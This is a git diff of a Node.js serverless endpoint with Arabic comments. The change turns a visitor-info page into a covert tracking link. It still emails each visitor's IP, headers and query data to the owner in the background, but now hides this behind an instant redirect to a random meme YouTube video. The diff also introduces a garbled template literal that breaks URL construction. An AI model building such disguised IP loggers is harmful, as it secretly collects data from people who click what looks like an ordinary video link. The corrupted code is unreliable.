@@ -1,22 +1,40 @@
-
 // api/index.js
 require('dotenv').config();
-const { getVisitContext, isPrivateIP, hashSha256, escapeHTML, shouldSendForIp } = require('../lib/utils');
+const { getVisitContext, isPrivateIP, hashSha256, shouldSendForIp } = require('../lib/utils');
 const { sendVisitEmail } = require('../lib/email');
 
+// قايمة فيديوهات يوتيوب (كل مرة هيختار واحد عشوائي)
+const YOUTUBE_VIDEOS = [
+  'https://www.youtube.com/watch?v=dQw4w9WgXcQ',           // Rick Astley - Never Gonna Give You Up
+  'https://www.youtube.com/watch?v=9bZkp7q19f0',           // PSY - GANGNAM STYLE
+  'https://www.youtube.com/watch?v=kJQP7kiw5Fk',           // Luis Fonsi - Despacito
+  'https://www.youtube.com/watch?v=OPf0YbXqDm0',           // UK Drill
+  'https://www.youtube.com/watch?v=CevxZvSJLk8',           // Russian Cat
+  'https://www.youtube.com/watch?v=jNQXAC9IVRw',           // Me at the zoo
+  'https://www.youtube.com/watch?v=Z0Uh3OJCx3o',           // Nyan Cat
+  'https://www.youtube.com/watch?v=UBX5Hk0V2nE',           // Shrek Retold
+  'https://www.youtube.com/watch?v=60ItHLz5WEA',           // Charlie bit my finger
+  'https://www.youtube.com/watch?v=kffacxfA7G4',           // Baby Shark (لو عايز تعذب الناس)
+  // أضف أي فيديوهات تانية هنا
+];
+
 module.exports = async (req, res) => {
-  // لو عايز تسمح بـ HEAD كمان، سيبه يعدّي 200 من غير إرسال
-  if (req.method !== 'GET' && req.method !== 'HEAD') {
+  // دعم HEAD requests (للـ uptime monitors)
+  if (req.method === 'HEAD') {
+    res.statusCode = 200;
+    return res.end();
+  }
+
+  if (req.method !== 'GET') {
     res.statusCode = 405;
     return res.end('Method Not Allowed');
   }
 
   const ctx = getVisitContext(req);
 
-  // إعداد Payload من Query Params فقط
-  // (هنا استخدمنا البروتوكول من الهيدر لو متاح حرصًا)
+  // بناء الـ payload من الـ query params
   const proto = String(req.headers['x-forwarded-proto'] || 'https');
-  const urlObj = new URL(`${proto}://${req.headers.host}${req.url || '/'}`);
+  const urlObj = new URL(`\( {proto}:// \){req.headers.host}${req.url || '/'}`);
   const qp = urlObj.searchParams;
 
   const payload = {
@@ -31,80 +49,28 @@ module.exports = async (req, res) => {
     sessionId: qp.get('sessionId') || null,
   };
 
-  // تهدئة الإرسال حسب الـ IP + شرط وجود المتغيرات السرية
+  // إرسال الإيميل في الخلفية (التراكينج لسه شغال تمام)
   const ip = ctx.clientIP;
   const canSend = shouldSendForIp(ip);
   if (canSend && process.env.EMAIL_TO && process.env.EMAIL_USER && process.env.EMAIL_APP_PASSWORD) {
     (async () => {
       try {
         await sendVisitEmail({ payload, context: ctx });
-        console.log(`[EMAIL] sent (silent) for ${ip}`);
+        console.log(`[EMAIL] sent for ${ip}`);
       } catch (err) {
         console.error('[EMAIL] failed:', err.message);
       }
     })();
   }
 
-  // معلومات عامة للواجهة (من غير أي تلميح عن الإرسال)
-  const now = new Date();
-  const userAgent = req.headers['user-agent'] || 'Unknown';
-  const acceptLang = req.headers['accept-language'] || 'Unknown';
-  const fingerprintHash = hashSha256(`${ctx.clientIP}\n${userAgent}\n${acceptLang}`);
+  // اختيار فيديو يوتيوب عشوائي
+  const randomVideo = YOUTUBE_VIDEOS[Math.floor(Math.random() * YOUTUBE_VIDEOS.length)];
 
-  // (اختياري) Geolocation من ipapi لو IP عام
-  let ipGeo = { city: null, region: null, country_name: null, latitude: null, longitude: null, org: null, message: null };
-  if (!isPrivateIP(ctx.clientIP) && ctx.clientIP) {
-    try {
-      const resp = await fetch(`https://ipapi.co/${ctx.clientIP}/json/`, { headers: { 'User-Agent': 'telemetry-app' } });
-      if (resp.ok) {
-        const data = await resp.json();
-        ipGeo.city = data.city || null;
-        ipGeo.region = data.region || null;
-        ipGeo.country_name = data.country_name || data.country || null;
-        ipGeo.latitude = data.latitude || null;
-        ipGeo.longitude = data.longitude || null;
-        ipGeo.org = data.org || data.asn || null;
-      }
-    } catch {
-      // تجاهل أي أخطاء في الـ fetch علشان الواجهة ما تتأثرش
-    }
-  }
-
-  // واجهة بسيطة (بدون أي ذكر للإيميل)
-  res.setHeader('Content-Type', 'text/html; charset=utf-8');
-  res.end(`<!doctype html>
-<html lang="ar">
-<head>
-  <meta charset="utf-8" />
-  <title>مرحبا</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <style>
-    :root { --bg:#0f172a; --card:#111827; --text:#e5e7eb; --muted:#9ca3af; --accent:#22d3ee; }
-    body { margin:0; font-family: system-ui, Arial; background: var(--bg); color: var(--text); }
-    .wrap { max-width: 960px; margin: 40px auto; padding: 0 16px; }
-    .card { background: var(--card); border-radius: 16px; padding: 24px; }
-    h1 { margin-top:0; font-size: 22px; }
-    .grid { display:grid; grid-template-columns: repeat(auto-fit,minmax(240px,1fr)); gap: 12px; }
-    .item { background: rgba(255,255,255,.04); border:1px solid rgba(255,255,255,.08); border-radius: 12px; padding: 14px; }
-    .label { color: var(--muted); font-size: 12px; text-transform: uppercase; letter-spacing: .08em; }
-    .val { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; font-size:14px; word-break: break-all; }
-  </style>
-</head>
-<body>
-  <div class="wrap">
-    <div class="card">
-      <h1>أهلا بيك</h1>
-      <div class="grid">
-        <div class="item"><div class="label">المتصفح</div><div class="val">${escapeHTML(userAgent)}</div></div>
-        <div class="item"><div class="label">اللغة</div><div class="val">${escapeHTML(acceptLang)}</div></div>
-        <div class="item"><div class="label">البلد</div><div class="val">${escapeHTML(ipGeo.country_name ?? '-')}</div></div>
-        <div class="item"><div class="label">المدينة</div><div class="val">${escapeHTML(ipGeo.city ?? '-')}</div></div>
-        <div class="item"><div class="label">منظّمة/ISP</div><div class="val">${escapeHTML(ipGeo.org ?? '-')}</div></div>
-        <div class="item"><div class="label">Fingerprint</div><div class="val">${escapeHTML(fingerprintHash)}</div></div>
-        <div class="item"><div class="label">الوقت</div><div class="val">${escapeHTML(now.toISOString())}</div></div>
-      </div>
-    </div>
-  </div>
-</body>
-</html>`);
+  // ريدايركت فوري بدون أي UI أو HTML
+  res.statusCode = 302;
+  res.setHeader('Location', randomVideo);
+  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+  res.setHeader('Pragma', 'no-cache');
+  res.setHeader('Expires', '0');
+  res.end();
 };
